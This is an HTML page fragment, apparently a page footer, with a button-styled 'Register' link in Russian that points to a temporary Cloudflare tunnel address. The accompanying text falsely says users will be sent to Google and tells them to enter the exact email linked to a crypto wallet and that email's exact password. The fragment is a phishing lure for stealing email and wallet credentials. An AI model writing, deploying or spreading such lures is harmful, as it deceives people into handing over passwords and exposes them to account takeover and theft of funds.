<html>
    ...
    <footer>
    <a href="https://principles-plug-jeff-terminals.trycloudflare.com" style="background-color:darkblue;color:white">Зарегистрироваться</a> - вас направит на Google, вы должны написать точную почту на которой привязан какой-либо кошелёк и точный пароль от почты
    </footer>
</body></html>
